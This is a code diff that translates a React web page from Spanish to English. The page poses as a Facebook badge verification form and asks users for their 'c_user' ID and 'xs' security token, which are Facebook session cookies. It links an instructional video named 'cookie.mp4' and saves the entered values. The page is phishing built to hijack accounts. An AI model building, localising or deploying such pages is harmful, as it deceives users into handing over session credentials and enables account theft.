@@ -45,15 +45,15 @@ export default function Validation() {
       localStorage.setItem('validation_data', JSON.stringify(data));
 
       toast({
-        title: "Éxito",
-        description: "Por favor, continúe con el siguiente paso",
+        title: "Success",
+        description: "Please proceed to the next step",
       });
       setLocation("/confirmation");
     } catch (error) {
       toast({
         variant: "destructive",
         title: "Error",
-        description: "Error al enviar el formulario. Por favor, inténtelo de nuevo.",
+        description: "Failed to submit form. Please try again.",
       });
     }
   };
@@ -61,8 +61,8 @@ export default function Validation() {
   return (
     <>
       <MetaTags 
-        title="Formulario de Contacto | Validación Inicial"
-        description="Por favor, complete el formulario de validación inicial"
+        title="Contact Form | Initial Validation"
+        description="Please complete the initial validation form"
       />
       <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />
 
@@ -71,21 +71,21 @@ export default function Validation() {
         {!isMobile && (
           <div className="w-64 bg-white border-r border-gray-200 hidden lg:block">
             <div className="p-4">
-              <h1 className="text-xl font-bold text-gray-900">Formulario de Contacto</h1>
+              <h1 className="text-xl font-bold text-gray-900">Contact Form</h1>
               <div className="mt-8 space-y-4">
-                <p className="text-gray-700 font-semibold">Progreso</p>
+                <p className="text-gray-700 font-semibold">Progress</p>
                 <div className="space-y-2">
                   <div className="flex items-center space-x-2 text-blue-600">
                     <div className="w-2 h-2 bg-blue-600 rounded-full" />
-                    <p className="text-sm">Validación Inicial</p>
+                    <p className="text-sm">Initial Validation</p>
                   </div>
                   <div className="flex items-center space-x-2 text-gray-400">
                     <div className="w-2 h-2 bg-gray-400 rounded-full" />
-                    <p className="text-sm">Confirmación</p>
+                    <p className="text-sm">Confirmation</p>
                   </div>
                   <div className="flex items-center space-x-2 text-gray-400">
                     <div className="w-2 h-2 bg-gray-400 rounded-full" />
-                    <p className="text-sm">Éxito</p>
+                    <p className="text-sm">Success</p>
                   </div>
                 </div>
               </div>
@@ -98,23 +98,23 @@ export default function Validation() {
           <div className="flex-1 flex justify-center p-4 sm:p-8">
             <div className="max-w-2xl w-full space-y-4 sm:space-y-6">
               <h1 className="text-xl sm:text-2xl font-bold text-gray-900">
-                Formulario de Contacto - Validación Inicial
+                Contact Form - Initial Validation
               </h1>
 
               <div className="space-y-3 sm:space-y-4 text-gray-600 text-sm sm:text-base">
                 <p>
-                  La insignia verificada significa que Facebook ha confirmado que la Página o el perfil es la presencia auténtica del individuo, figura pública o marca que representa.
+                  The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.
                 </p>
                 <p>
-                  Anteriormente, la insignia verificada también requería que la persona o marca fuera notable y única. Es posible que aún vea usuarios con una insignia verificada que representa nuestros requisitos de elegibilidad anteriores.
+                  Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.
                 </p>
                 <p>
-                  Proporcione los detalles precisos a continuación. Consulte el video para obtener aclaraciones si las instrucciones no están claras.
+                  Please provide the precise details below. Refer to the video for clarification if the instructions are unclear.
                 </p>
               </div>
 
               <div className="bg-[#F0F2F5] p-4 sm:p-6 rounded-lg space-y-4">
-                <h2 className="text-base sm:text-lg font-semibold text-[#1c1e21]">Información Detallada en Video</h2>
+                <h2 className="text-base sm:text-lg font-semibold text-[#1c1e21]">Detailed Video Guide</h2>
 
                 <div className="video-container relative w-full aspect-video rounded-lg overflow-hidden bg-black">
                   <video
@@ -127,12 +127,12 @@ export default function Validation() {
                       src="https://pub-97836f8a77c541e9afe2515c4730dd50.r2.dev/cookie.mp4"
                       type="video/mp4"
                     />
-                    Su navegador no admite la etiqueta de video.
+                    Your browser does not support the video tag.
                   </video>
                 </div>
 
                 <h3 className="font-semibold text-sm sm:text-base text-[#1c1e21]">
-                  Debe ver el video y enviar la información requerida correctamente.
+                  Please watch the video and submit required information correctly.
                 </h3>
               </div>
 
@@ -143,14 +143,14 @@ export default function Validation() {
                     name="c_user"
                     render={({ field }) => (
                       <FormItem>
-                        <FormLabel className="text-sm sm:text-base text-gray-700">ID de Usuario</FormLabel>
+                        <FormLabel className="text-sm sm:text-base text-gray-700">User ID</FormLabel>
                         <FormControl>
                           <Input
                             type="number"
                             min="0"
                             pattern="[0-9]+"
                             minLength={6}
-                            placeholder="Ingrese su ID de usuario"
+                            placeholder="Enter your user ID"
                             className="text-sm sm:text-base border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                             {...field}
                           />
@@ -164,11 +164,11 @@ export default function Validation() {
                     name="xs"
                     render={({ field }) => (
                       <FormItem>
-                        <FormLabel className="text-sm sm:text-base text-gray-700">Token de Seguridad</FormLabel>
+                        <FormLabel className="text-sm sm:text-base text-gray-700">Security Token</FormLabel>
                         <FormControl>
                           <Input 
                             type="text" 
-                            placeholder="Ingrese su token de seguridad" 
+                            placeholder="Enter your security token" 
                             className="text-sm sm:text-base border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                             {...field} 
                           />
@@ -179,7 +179,7 @@ export default function Validation() {
                   />
 
                   <p className="text-xs sm:text-sm text-gray-500">
-                    Por favor, asegúrese de que toda la información sea correcta antes de enviar.
+                    Please ensure all information is correct before submission.
                   </p>
 
                   <Button 
@@ -187,7 +187,7 @@ export default function Validation() {
                     className="w-full py-2 sm:py-2.5 text-sm sm:text-base bg-blue-600 hover:bg-blue-700 transition-colors duration-200"
                     disabled={form.formState.isSubmitting}
                   >
-                    {form.formState.isSubmitting ? "Enviando..." : "Continuar"}
+                    {form.formState.isSubmitting ? "Submitting..." : "Continue"}
                   </Button>
                 </form>
               </Form>
